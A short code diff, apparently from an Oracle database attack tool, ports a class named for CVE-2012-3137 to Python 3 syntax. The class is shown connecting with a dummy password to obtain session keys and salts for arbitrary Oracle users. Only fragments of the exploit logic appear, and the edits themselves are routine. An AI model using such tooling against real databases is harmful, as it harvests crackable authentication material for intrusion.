@@ -114,7 +114,7 @@ class CVE_2012_3137 ():
 			connectString = "{0}/{1}@{2}:{3}/{4}".format(user, 'aaaaaaa', self.args['server'], self.args['port'], self.args['sid'])
 			logging.debug("Connecting with {0}".format(connectString))
 			cx_Oracle.connect(connectString)
-		except Exception, e:
+		except Exception as e:
 			pass
 
 	def getAPassword(self,user):
@@ -234,7 +234,7 @@ class CVE_2012_3137 ():
 		Test all functions
 		'''
 		self.args['print'].subtitle("Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?")
-		if self.args.has_key('user') == False or self.args.has_key('password') == False or self.args['user'] == None or self.args['password'] == None : 
+		if ('user' in self.args) == False or ('password' in self.args) == False or self.args['user'] == None or self.args['password'] == None : 
 			self.args['print'].unknownNews("Impossible to know if the database is vulnreable to the CVE-2012-3137.\nYou need to give VALID credentials on the database (-U and -P). Otherwise, the tool can't know if the database is vulnerable...")
 		else:
 			if 1==1:
